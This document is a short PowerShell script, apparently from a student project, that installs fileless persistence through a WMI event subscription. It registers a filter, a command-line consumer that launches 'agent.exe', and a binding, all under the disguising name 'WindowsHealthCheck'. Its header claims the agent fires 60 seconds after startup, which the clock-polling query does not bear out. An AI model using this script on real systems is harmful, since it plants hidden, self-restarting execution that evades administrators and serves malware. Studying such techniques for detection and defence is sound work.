# [TECHNIQUE]: WMI Event Subscription
# [TARGET]: WMI Repository (Fileless)
# [PRIVILEGE]: Administrator
# [DESCRIPTION]: Triggers the agent 60 seconds after system startup.

$AgentPath = "C:\\Users\\abdul\\Downloads\\FYP\\task1\\agent.exe"
$Name = "WindowsHealthCheck"

# Check if it already exists to avoid the "Already Exists" error
$Existing = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$Name'" -ErrorAction SilentlyContinue

if ($null -eq $Existing) {
    # 1. The Filter
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = $Name
        EventNamespace = 'root\cimv2'
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
    }

    # 2. The Consumer
    $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = $Name
        CommandLineTemplate = $AgentPath
    }

    # 3. The Binding
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }
    Write-Output "[SUCCESS] WMI Subscription created."
} else {
    Write-Output "[INFO] WMI Subscription already exists. No action needed."
}
